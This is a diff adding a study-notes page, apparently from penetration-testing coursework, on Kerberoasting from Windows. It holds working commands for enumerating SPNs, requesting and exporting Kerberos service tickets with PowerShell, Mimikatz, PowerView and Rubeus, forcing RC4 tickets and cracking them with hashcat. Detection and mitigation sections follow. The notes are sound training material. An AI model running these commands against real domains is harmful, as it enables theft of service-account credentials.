@@ -1,0 +1,255 @@
+---
+title: "Kerberoasting from Windows"
+description: "Organized Active Directory study notes and reference."
+---
+
+{/* Generated from Active Directory/13 Kerberoasting from Windows.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Compare the semi-manual, PowerView, and Rubeus methods in your notes.
+
+[AD study path](/active-directory/index) · [Command reference](/active-directory/command-reference) · [Troubleshooting](/active-directory/troubleshooting)
+
+## Kerberoasting From Windows - CPTS Study Notes
+
+> Use only in authorized lab environments such as HTB or systems where you have explicit permission to test.
+
+## What Kerberoasting Is
+
+Kerberoasting is an Active Directory attack technique that targets service accounts with Service Principal Names (SPNs). An authenticated domain user can request Kerberos TGS tickets for these services. The ticket material can then be exported and tested offline against candidate passwords.
+
+## Key Workflow
+
+1. Enumerate SPNs in the domain.
+2. Identify user-backed service accounts and ignore ordinary computer accounts where appropriate.
+3. Request TGS tickets for selected SPNs.
+4. Extract or export the tickets.
+5. Convert tickets into a format supported by a password-auditing tool.
+6. Test the tickets offline against candidate passwords.
+7. Validate any recovered credentials and document the resulting access.
+
+## Semi-Manual Method
+
+### 1. Enumerate SPNs with `setspn.exe`
+
+```cmd
+setspn.exe -Q */*
+```
+
+This returns SPNs registered throughout the domain. Focus on SPNs associated with user service accounts rather than computer accounts.
+
+### 2. Request a Ticket for One SPN
+
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+`Add-Type` loads the required .NET assembly. `KerberosRequestorSecurityToken` requests a TGS for the supplied SPN and places it in the current logon session.
+
+### 3. Request Tickets from Enumerated SPNs
+
+```powershell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
+This is less selective because it also requests tickets for computer-backed SPNs.
+
+### 4. Export Cached Tickets with Mimikatz
+
+```text
+base64 /out:true
+kerberos::list /export
+```
+
+With Base64 output enabled, Mimikatz prints each exported ticket as a Base64 blob. Without it, `kerberos::list /export` writes `.kirbi` files to disk.
+
+### 5. Rebuild a `.kirbi` File from Base64
+
+Remove line breaks from the copied blob:
+
+```bash
+echo "<base64_blob>" | tr -d '\n'
+```
+
+Save the single-line output in a file, then decode it:
+
+```bash
+cat encoded_file | base64 -d > sqldev.kirbi
+```
+
+### 6. Convert the Ticket
+
+```bash
+python2.7 kirbi2john.py sqldev.kirbi
+```
+
+The version used in the module creates a file named `crack_file`. Convert its output to the expected etype 23 format:
+
+```bash
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*\$\2/' crack_file > sqldev_tgs_hashcat
+```
+
+### 7. Test an RC4 Ticket Offline
+
+```bash
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+```
+
+Hashcat mode `13100` is used for Kerberos 5 TGS-REP etype 23, or RC4.
+
+## PowerView Method
+
+### Import PowerView and Enumerate SPN Users
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+
+### Request a Ticket for One User
+
+```powershell
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+
+### Export All Results to CSV
+
+```powershell
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+PowerView can output TGS material directly in Hashcat format, avoiding the `.kirbi` conversion process.
+
+## Rubeus Method
+
+### Show Kerberoastable Account Statistics
+
+```powershell
+.\Rubeus.exe kerberoast /stats
+```
+
+This lists useful information without requesting tickets, including the number of accounts, supported encryption types, and password-last-set years.
+
+### Target One User
+
+```powershell
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
+### Write Results to a File
+
+```powershell
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+```
+
+### Limit Results with an LDAP Filter
+
+```powershell
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+`/nowrap` keeps output on one line, which makes it easier to save for offline testing. An `admincount=1` filter can identify potentially high-value accounts, but the attribute is not definitive proof that an account is currently privileged.
+
+### Other Options Mentioned in the Section
+
+- `/stats`: List statistics without sending ticket requests.
+- `/user:USER`: Select one account.
+- `/spn:"service/host"`: Select one SPN.
+- `/outfile:FILE`: Save output to a file.
+- `/simple`: Print file-style output to the console.
+- `/creduser` and `/credpassword`: Use alternate credentials.
+- `/delay` and `/jitter`: Space out requests.
+- `/resultlimit`: Limit the number of results.
+- `/aes`: Request AES tickets.
+- `/nowrap`: Prevent wrapped output.
+- `/tgtdeleg`: In some older environments, request RC4-only service tickets.
+
+## Encryption Types
+
+- **RC4, etype 23:** Hashes commonly begin with `$krb5tgs$23$`. They are substantially faster to test offline.
+- **AES128, etype 17:** Stronger and slower to test.
+- **AES256, etype 18:** Hashes begin with `$krb5tgs$18$` and are substantially slower to test than RC4.
+
+Check an account's configured encryption types with PowerView:
+
+```powershell
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+```
+
+In the module examples:
+
+- `msDS-SupportedEncryptionTypes = 0` means no explicit type is defined and RC4 is used by default in that setup.
+- `msDS-SupportedEncryptionTypes = 24` indicates AES128 and AES256 support.
+
+Use Hashcat mode `19700` for an AES256 TGS-REP:
+
+```bash
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+```
+
+The section notes that the `/tgtdeleg` RC4 downgrade behavior does not work against Windows Server 2019 domain controllers in the demonstrated scenario. Such controllers return a ticket using the strongest encryption type supported by the target account.
+
+## Detection
+
+Enable **Audit Kerberos Service Ticket Operations** on domain controllers and monitor:
+
+- **Event ID 4769:** A Kerberos service ticket was requested.
+- **Event ID 4770:** A Kerberos service ticket was renewed.
+
+Possible indicators include:
+
+- Many TGS requests from one account in a short period.
+- Requests for numerous service accounts in rapid succession.
+- Unexpected RC4 ticket requests, shown as ticket encryption type `0x17` in the module example.
+
+Normal request volume depends on the environment, so detections should use an established baseline rather than a universal fixed threshold.
+
+## Mitigation
+
+- Use long, random passwords or passphrases for traditional service accounts.
+- Prefer Managed Service Accounts and Group Managed Service Accounts.
+- Rotate service-account passwords regularly.
+- Avoid assigning SPNs to highly privileged accounts.
+- Restrict RC4 where compatibility testing shows it is safe.
+- Monitor Event IDs 4769 and 4770 for anomalies.
+- Test encryption-policy changes before deployment because disabling an encryption type can break legacy services.
+
+## Quick Reference
+
+```cmd
+:: Enumerate domain SPNs
+setspn.exe -Q */*
+```
+
+```powershell
+# Request a ticket for one SPN
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+
+# PowerView enumeration and ticket request
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
+
+# Rubeus statistics and a targeted request
+.\Rubeus.exe kerberoast /stats
+.\Rubeus.exe kerberoast /user:<USER> /nowrap
+```
+
+```bash
+# Decode and convert an exported ticket
+cat encoded_file | base64 -d > ticket.kirbi
+python2.7 kirbi2john.py ticket.kirbi
+
+# Hashcat modes from the section
+hashcat -m 13100 rc4_hashes wordlist.txt
+hashcat -m 19700 aes256_hashes wordlist.txt
+```
+
+---
+
+Source: [original AD notes](/downloads/active-directory-160bf8c2.txt), lines 1251–1487. Original examples and outputs are retained; corrections are explained above or in troubleshooting.
+
+Previous: [Kerberoasting from Linux](/active-directory/kerberoasting-linux)
+
+Next: [ACL Abuse Primer](/active-directory/acl-primer)
